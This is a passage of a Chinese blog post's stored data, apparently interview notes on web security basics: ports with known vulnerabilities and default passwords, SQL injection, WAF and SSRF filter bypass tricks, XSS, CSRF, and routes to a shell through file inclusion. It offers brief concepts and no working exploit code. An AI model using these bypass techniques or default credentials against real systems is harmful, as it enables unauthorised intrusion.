Mozilla/5.0\nHost: Host\nAccept: */*\n```\n\n如上面的http请求，一般同一参数名字只能传参一次，但是http协议中允许同样名称的参数出现多次。\n\n不同的服务器处理结果会不一样，利用这个特性进行绕过。\n\n## XSS类型\n\n反射型，存储型，DOM型\n\n## xss可利用的协议\n\njavascript 伪协议，data 协议，MHTML注射XSS\n\n## 同源策略\n\n3同，同域名同端口同协议。作用就是防止文档或脚本从不同源加载。\n\n## CSRF\n\n定义：攻击者劫持用户访问web站点执行非用户本意的操作。\n\n完成csrf的即可条件：\n\n1. 受害者处于登录状态\n2. 诱使用受害者点击连接\n3. 系统对敏感操作没有进行验证\n\n## 常见的请求方式有哪些\n\npost,get,options,head,connect,trace,delete,put\n\n## ssrf利用协议\n\n最具代表性几个，dict操作redis,file任意文件读，gopher反弹shell，tftp发起udp拒绝服务\n\n## ssrf无回显怎么办\n\n利用dnslog\n\n## ssrf如何绕过方式\n\n1）[http://www.baidu.com@10.10.10.10与http://10.10.10.10](http://www.baidu.com@10.10.10.xn--10http-4p7i//10.10.10.10) 请求是相同的\n\n此脚本访问请求得到的内容都是10.10.10.10的内容。\n\n该绕过同样在URL跳转绕过中适用。\n\n<http://www.wooyun.org/bugs/wooyun-2015-091690>\n\n> 乌云镜像的url中的html替换为wooyun-2015-091690.html\n\n2）ip地址转换成进制来访问\n\n115.239.210.26 ＝ 16373751032\n\n3）添加端口可能绕过匹配正则\n\n10.10.10.10:80 案例：\n\n<http://www.wooyun.org/bugs/wooyun-2014-061850>\n\n> 乌云镜像的url中的html替换为wooyun-2014-061850.html\n\n4）localhost绕过\n\n5）用短地址（302跳转）绕过，案例:\n\n搜狐某云平台API接口SSRF续集-绕过:https://bugs.shuimugan.com/bug/view?bug_no=0132243\n\n神器而已之奇虎360某SSRF绕过限制代理访问内网:https://bugs.shuimugan.com/bug/view?bug_no=0135257\n\n5）利用xip.io和xip.name\n\n```\n10.0.0.1.xip.io 10.0.0.1\n\nwww.10.0.0.1.xip.io 10.0.0.1\n\nmysite.10.0.0.1.xip.io 10.0.0.1\n\nfoo.bar.10.0.0.1.xip.io 10.0.0.1\n10.0.0.1.xip.name  resolves to  10.0.0.1\n\nwww.10.0.0.2.xip.name  resolves to  10.0.0.2\n\nfoo.10.0.0.3.xip.name  resolves to  10.0.0.3\n\nbar.baz.10.0.0.4.xip.name  resolves to  10.0.0.4\n```\n\n6）利用Enclosed alphanumerics\n\n```\n利用Enclosed alphanumerics\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n```\n\n7) 利用句号\n\n```\n127。0。0。1  >>>  127.0.0.1\n```\n\n## 文件包含有哪些伪协议\n\nhttps://www.yingyingguaier.top/2019/01/03/php%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/#more\n\n## 文件包含如何getshell\n\n1. 远程文件包含：可以直接执行任意代码\n\n   ------\n\n   下面是本地包含\n\n   ------\n\n2. 上传图片马包含\n\n3. 包含日志文件Getshell\n\n4. 利用data伪协议和php://input流执行php代码\n\n5. 存在phpinfo信息泄露可包含临时文件\n\n6. 包涵session文件\n\n\n","source":"_posts/Web基础知识.md","raw":"---\ntitle: Web基础知识\ndate: 2019-01-05 11:18:24\ntags: \n---\n\n# 基础知识\n\n------\n\n## 常见的端口\n\n|      端口号       |     服务      |             漏洞              |\n| :---------------: | :-----------: | :---------------------------: |\n|        21         |      ftp      |                               |\n|        22         |      ssh      |                               |\n|        23         |    telnet     |                               |\n|        161        |     snmp      |                               |\n|        443        |    openssl    |           心脏滴血            |\n|        837        |     Rsync     |            未授权             |\n|       1433        |    MSSSQL     |                               |\n|       1521        |    Oracle     |                               |\n|       2375        |    docker     |            未授权             |\n|       3306        |     Mysql     |                               |\n|       3389        |   远程连接    |                               |\n|       5432        |  PostgreSQL   |                               |\n|       5900        |      vnc      |                               |\n|       6379        |     redis     |            未授权             |\n|  7001,7002,7003   |   Weblogic    |      默认弱口令，反序列       |\n|       9000        |  fastcgi-php  |                               |\n|     9200,9300     | elasticsearch |  CVE-2015-1427,CVE-2014-3120  |\n|       11211       |   memcache    |            未授权             |\n|    27017,27018    |    Mongodb    |          未授权访问           |\n|       1099        |      rmi      |           命令执行            |\n|     2601,2604     |     zebra     |     路由，默认密码 zebra      |\n|       3128        |     squid     |         代理默认端口          |\n|       4440        |    rundeck    |                               |\n|       4848        |   glassfish   | 中间件弱口令 admin/adminadmin |\n|       5984        |    CouchDB    |    http://xxx:5984/_utils/    |\n|       8000        |   jdwp java   |       调试接口命令执行        |\n|       9043        |   websphere   |      弱口令 admin/admin       |\n|       50000       |      SAP      |           命令执行            |\n| 50060,50070,50030 |    hadoop     |      默认端口未授权访问       |\n\n## SQL注入类型\n\n数字型，字符型，搜索型\n\n## 联合查询的条件（union select）\n\n1. 页面有注入回显\n2. 拼接的两个结果集必须有相同列数,列的数据类型相同\n\n## DNSlog知道吗？是否能在Linux利用\n\nhttps://www.anquanke.com/post/id/98096\n\n![001](/img/knowledge/web/001.jpg)\n\nload_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的UNC路径\n\n## 绕过waf的方法\n\nhttps://www.freebuf.com/column/163469.html\n\n## 利用过参数污染绕过waf吗？\n\n在跟服务器交互的过程中，http允许 get 或者post多次传同一参数值，造成覆盖达到一些绕过waf的效果。\n\n```\nGET /foo?par1=val1&par2=val2 HTTP/1.1\nUser-Agent: Mozilla/5.0\nHost: Host\nAccept: */*\n```\n\n如上面的http请求，一般同一参数名字只能传参一次，但是http协议中允许同样名称的参数出现多次。\n\n不同的服务器处理结果会不一样，利用这个特性进行绕过。\n\n## XSS类型\n\n反射型，存储型，DOM型\n\n## xss可利用的协议\n\njavascript 伪协议，data 协议，MHTML注射XSS\n\n## 同源策略\n\n3同，同域名同端口同协议。作用就是防止文档或脚本从不同源加载。\n\n## CSRF\n\n定义：攻击者劫持用户访问web站点执行非用户本意的操作。\n\n完成csrf的即可条件：\n\n1. 受害者处于登录状态\n2. 诱使用受害者点击连接\n3. 系统对敏感操作没有进行验证\n\n## 常见的请求方式有哪些\n\npost,get,options,head,connect,trace,delete,put\n\n## ssrf利用协议\n\n最具代表性几个，dict操作redis,file任意文件读，gopher反弹shell，tftp发起udp拒绝服务\n\n## ssrf无回显怎么办\n\n利用dnslog\n\n## ssrf如何绕过方式\n\n1）[http://www.baidu.com@10.10.10.10与http://10.10.10.10](http://www.baidu.com@10.10.10.xn--10http-4p7i//10.10.10.10) 请求是相同的\n\n此脚本访问请求得到的内容都是10.10.10.10的内容。\n\n该绕过同样在URL跳转绕过中适用。\n\n<http://www.wooyun.org/bugs/wooyun-2015-091690>\n\n> 乌云镜像的url中的html替换为wooyun-2015-091690.html\n\n2）ip地址转换成进制来访问\n\n115.239.210.26 ＝ 16373751032\n\n3）添加端口可能绕过匹配正则\n\n10.10.10.10:80 案例：\n\n<http://www.wooyun.org/bugs/wooyun-2014-061850>\n\n> 乌云镜像的url中的html替换为wooyun-2014-061850.html\n\n4）localhost绕过\n\n5）用短地址（302跳转）绕过，案例:\n\n搜狐某云平台API接口SSRF续集-绕过:https://bugs.shuimugan.com/bug/view?bug_no=0132243\n\n神器而已之奇虎360某SSRF绕过限制代理访问内网:https://bugs.shuimugan.com/bug/view?bug_no=0135257\n\n5）利用xip.io和xip.name\n\n```\n10.0.0.1.xip.io 10.0.0.1\n\nwww.10.0.0.1.xip.io 10.0.0.1\n\nmysite.10.0.0.1.xip.io 10.0.0.1\n\nfoo.bar.10.0.0.1.xip.io 10.0.0.1\n10.0.0.1.xip.name  resolves to  10.0.0.1\n\nwww.10.0.0.2.xip.name  resolves to  10.0.0.2\n\nfoo.10.0.0.3.xip.name  resolves to  10.0.0.3\n\nbar.baz.10.0.0.4.xip.name  resolves to  10.0.0.4\n```\n\n6）利用Enclosed alphanumerics\n\n```\n利用Enclosed alphanumerics\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n```\n\n7) 利用句号\n\n```\n127。0。0。1  >>>  127.0.0.1\n```\n\n## 文件包含有哪些伪协议\n\nhttps://www.yingyingguaier.top/2019/01/03/php%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/#more\n\n## 文件包含如何getshell\n\n1. 远程文件包含：可以直接执行任意代码\n\n   ------\n\n   下面是本地包含\n\n   ------\n\n2. 上传图片马包含\n\n3. 包含日志文件Getshell\n\n4. 利用data伪协议和php://input流执行php代码\n\n5. 存在phpinfo信息泄露可包含临时文件\n\n6. 包涵session文件\n\n\n","slug":"Web基础知识","published":1,"updated":"2019-06-19T17:23:13.382Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istc1000s4dsb49u27ccc","content":"<h1 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h1><hr>\n<h2 id=\"常见的端口\"><a href=\"#常见的端口\" class=\"headerlink\" title=\"常见的端口\"></a>常见的端口</h2><table>\n<thead>\n<tr>\n<th align=\"center\">端口号</th>\n<th align=\"center\">服务</th>\n<th align=\"center\">漏洞</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">21</td>\n<td align=\"center\">ftp</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">22</td>\n<td align=\"center\">ssh</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">23</td>\n<td align=\"center\">telnet</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">161</td>\n<td align=\"center\">snmp</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">443</td>\n<td align=\"center\">openssl</td>\n<td align=\"center\">心脏滴血</td>\n</tr>\n<tr>\n<td align=\"center\">837</td>\n<td align=\"center\">Rsync</td>\n<td align=\"center\">未授权</td>\n</tr>\n<tr>\n<td align=\"center\">1433</td>\n<td align=\"center\">MSSSQL</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">1521</td>\n<td align=\"center\">Oracle</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">2375</td>\n<td align=\"center\">docker</td>\n<td align=\"center\">未授权</td>\n</tr>\n<tr>\n<td align=\"center\">3306</td>\n<td align=\"center\">Mysql</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">3389</td>\n<td align=\"center\">远程连接</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">5432</td>\n<td align=\"center\">PostgreSQL</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">5900</td>\n<td align=\"center\">vnc</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">6379</td>\n<td align=\"center\">redis</td>\n<td align=\"center\">未授权</td>\n</tr>\n<tr>\n<td align=\"center\">7001,7002,7003</td>\n<td align=\"center\">Weblogic</td>\n<td align=\"center\">默认弱口令，反序列</td>\n</tr>\n<tr>\n<td align=\"center\">9000</td>\n<td align=\"center\">fastcgi-php</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">9200,9300</td>\n<td align=\"center\">elasticsearch</td>\n<td align=\"center\">CVE-2015-1427,CVE-2014-3120</td>\n</tr>\n<tr>\n<td align=\"center\">11211</td>\n<td align=\"center\">memcache</td>\n<td align=\"center\">未授权</td>\n</tr>\n<tr>\n<td align=\"center\">27017,27018</td>\n<td align=\"center\">Mongodb</td>\n<td align=\"center\">未授权访问</td>\n</tr>\n<tr>\n<td align=\"center\">1099</td>\n<td align=\"center\">rmi</td>\n<td align=\"center\">命令执行</td>\n</tr>\n<tr>\n<td align=\"center\">2601,2604</td>\n<td align=\"center\">zebra</td>\n<td align=\"center\">路由，默认密码 zebra</td>\n</tr>\n<tr>\n<td align=\"center\">3128</td>\n<td align=\"center\">squid</td>\n<td align=\"center\">代理默认端口</td>\n</tr>\n<tr>\n<td align=\"center\">4440</td>\n<td align=\"center\">rundeck</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">4848</td>\n<td align=\"center\">glassfish</td>\n<td align=\"center\">中间件弱口令 admin/adminadmin</td>\n</tr>\n<tr>\n<td align=\"center\">5984</td>\n<td align=\"center\">CouchDB</td>\n<td align=\"center\"><a href=\"http://xxx:5984/_utils/\" target=\"_blank\" rel=\"noopener\">http://xxx:5984/_utils/</a></td>\n</tr>\n<tr>\n<td align=\"center\">8000</td>\n<td align=\"center\">jdwp java</td>\n<td align=\"center\">调试接口命令执行</td>\n</tr>\n<tr>\n<td align=\"center\">9043</td>\n<td align=\"center\">websphere</td>\n<td align=\"center\">弱口令 admin/admin</td>\n</tr>\n<tr>\n<td align=\"center\">50000</td>\n<td align=\"center\">SAP</td>\n<td align=\"center\">命令执行</td>\n</tr>\n<tr>\n<td align=\"center\">50060,50070,50030</td>\n<td align=\"center\">hadoop</td>\n<td align=\"center\">默认端口未授权访问</td>\n</tr>\n</tbody></table>\n<h2 id=\"SQL注入类型\"><a href=\"#SQL注入类型\" class=\"headerlink\" title=\"SQL注入类型\"></a>SQL注入类型</h2><p>数字型，字符型，搜索型</p>\n<h2 id=\"联合查询的条件（union-select）\"><a href=\"#联合查询的条件（union-select）\" class=\"headerlink\" title=\"联合查询的条件（union select）\"></a>联合查询的条件（union select）</h2><ol>\n<li>页面有注入回显</li>\n<li>拼接的两个结果集必须有相同列数,列的数据类型相同</li>\n</ol>\n<h2 id=\"DNSlog知道吗？是否能在Linux利用\"><a href=\"#DNSlog知道吗？是否能在Linux利用\" class=\"headerlink\" title=\"DNSlog知道吗？是否能在Linux利用\"></a>DNSlog知道吗？是否能在Linux利用</h2><p><a href=\"https://www.anquanke.com/post/id/98096\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/98096</a></p>\n<p><img src=\"/img/knowledge/web/001.jpg\" alt=\"001\"></p>\n<p>load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的UNC路径</p>\n<h2 id=\"绕过waf的方法\"><a href=\"#绕过waf的方法\" class=\"headerlink\" title=\"绕过waf的方法\"></a>绕过waf的方法</h2><p><a href=\"https://www.freebuf.com/column/163469.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/column/163469.html</a></p>\n<h2 id=\"利用过参数污染绕过waf吗？\"><a href=\"#利用过参数污染绕过waf吗？\" class=\"headerlink\" title=\"利用过参数污染绕过waf吗？\"></a>利用过参数污染绕过waf吗？</h2><p>在跟服务器交互的过程中，http允许 get 或者post多次传同一参数值，造成覆盖达到一些绕过waf的效果。</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/foo?par1=val1&amp;par2=val2</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: Host</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: */*</span><br></pre></td></tr></table></figure>\n\n<p>如上面的http请求，一般同一参数名字只能传参一次，但是http协议中允许同样名称的参数出现多次。</p>\n<p>不同的服务器处理结果会不一样，利用这个特性进行绕过。</p>\n<h2 id=\"XSS类型\"><a href=\"#XSS类型\" class=\"headerlink\" title=\"XSS类型\"></a>XSS类型</h2><p>反射型，存储型，DOM型</p>\n<h2 id=\"xss可利用的协议\"><a href=\"#xss可利用的协议\" class=\"headerlink\" title=\"xss可利用的协议\"></a>xss可利用的协议</h2><p>javascript 伪协议，data 协议，MHTML注射XSS</p>\n<h2 id=\"同源策略\"><a href=\"#同源策略\" class=\"headerlink\" title=\"同源策略\"></a>同源策略</h2><p>3同，同域名同端口同协议。作用就是防止文档或脚本从不同源加载。</p>\n<h2 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h2><p>定义：攻击者劫持用户访问web站点执行非用户本意的操作。</p>\n<p>完成csrf的即可条件：</p>\n<ol>\n<li>受害者处于登录状态</li>\n<li>诱使用受害者点击连接</li>\n<li>系统对敏感操作没有进行验证</li>\n</ol>\n<h2 id=\"常见的请求方式有哪些\"><a href=\"#常见的请求方式有哪些\" class=\"headerlink\" title=\"常见的请求方式有哪些\"></a>常见的请求方式有哪些</h2><p>post,get,options,head,connect,trace,delete,put</p>\n<h2 id=\"ssrf利用协议\"><a href=\"#ssrf利用协议\" class=\"headerlink\" title=\"ssrf利用协议\"></a>ssrf利用协议</h2><p>最具代表性几个，dict操作redis,file任意文件读，gopher反弹shell，tftp发起udp拒绝服务</p>\n<h2 id=\"ssrf无回显怎么办\"><a href=\"#ssrf无回显怎么办\" class=\"headerlink\" title=\"ssrf无回显怎么办\"></a>ssrf无回显怎么办</h2><p>利用dnslog</p>\n<h2 id=\"ssrf如何绕过方式\"><a href=\"#ssrf如何绕过方式\" class=\"headerlink\" title=\"ssrf如何绕过方式\"></a>ssrf如何绕过方式</h2><p>1）<a href=\"http://www.baidu.com@10.10.10.xn--10http-4p7i//10.10.10.10\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com@10.10.10.10与http://10.10.10.10</a> 请求是相同的</p>\n<p>此脚本访问请求得到的内容都是10.10.10.10的内容。</p>\n<p>该绕过同样在URL跳转绕过中适用。</p>\n<p><a href=\"http://www.wooyun.org/bugs/wooyun-2015-091690\" target=\"_blank\" rel=\"noopener\">http://www.wooyun.org/bugs/wooyun-2015-091690</a></p>\n<blockquote>\n<p>乌云镜像的url中的html替换为wooyun-2015-091690.html</p>\n</blockquote>\n<p>2）ip地址转换成进制来访问</p>\n<p>115.239.210.26 ＝ 16373751032</p>\n<p>3）添加端口可能绕过匹配正则</p>\n<p>10.10.10.10:80 案例：</p>\n<p><a href=\"http://www.wooyun.org/bugs/wooyun-2014-061850\" target=\"_blank\" rel=\"noopener\">http://www.wooyun.org/bugs/wooyun-2014-061850</a></p>\n<blockquote>\n<p>乌云镜像的url中的html替换为wooyun-2014-061850.html</p>\n</blockquote>\n<p>4）localhost绕过</p>\n<p>5）用短地址（302跳转）绕过，案例:</p>\n<p>搜狐某云平台API接口SSRF续集-绕过:<a href=\"https://bugs.shuimugan.com/bug/view?bug_no=0132243\" target=\"_blank\" rel=\"noopener\">https://bugs.shuimugan.com/bug/view?bug_no=0132243</a></p>\n<p>神器而已之奇虎360某SSRF绕过限制代理访问内网:<a href=\"https://bugs.shuimugan.com/bug/view?bug_no=0135257\" target=\"_blank\" rel=\"noopener\">https://bugs.shuimugan.com/bug/view?bug_no=0135257</a></p>\n<p>5）利用xip.io和xip.name</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.io</span> 10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">www</span><span class=\"selector-class\">.10</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.io</span> 10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">mysite</span><span class=\"selector-class\">.10</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.io</span> 10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">foo</span><span class=\"selector-class\">.bar</span><span class=\"selector-class\">.10</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.io</span> 10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span></span><br><span class=\"line\">10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.name</span>  <span class=\"selector-tag\">resolves</span> <span class=\"selector-tag\">to</span>  10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">www</span><span class=\"selector-class\">.10</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.2</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.name</span>  <span class=\"selector-tag\">resolves</span> <span class=\"selector-tag\">to</span>  10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">foo</span><span class=\"selector-class\">.10</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.name</span>  <span class=\"selector-tag\">resolves</span> <span class=\"selector-tag\">to</span>  10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">bar</span><span class=\"selector-class\">.baz</span><span class=\"selector-class\">.10</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.4</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.name</span>  <span class=\"selector-tag\">resolves</span> <span class=\"selector-tag\">to</span>  10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.4</span></span><br></pre></td></tr></table></figure>\n\n<p>6）利用Enclosed alphanumerics</p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用Enclosed alphanumerics</span><br><span class=\"line\">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  <span class=\"meta\">&gt;&gt;&gt;  </span>example.com</span><br><span class=\"line\"><span class=\"symbol\">List:</span></span><br><span class=\"line\">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>\n\n<p>7) 利用句号</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">127</span>。<span class=\"number\">0</span>。<span class=\"number\">0</span>。<span class=\"number\">1</span>  &gt;&gt;&gt;  <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"文件包含有哪些伪协议\"><a href=\"#文件包含有哪些伪协议\" class=\"headerlink\" title=\"文件包含有哪些伪协议\"></a>文件包含有哪些伪协议</h2><p><a href=\"https://www.yingyingguaier.top/2019/01/03/php%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/#more\" target=\"_blank\" rel=\"noopener\">https://www.yingyingguaier.top/2019/01/03/php%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/#more</a></p>\n<h2 id=\"文件包含如何getshell\"><a href=\"#文件包含如何getshell\" class=\"headerlink\" 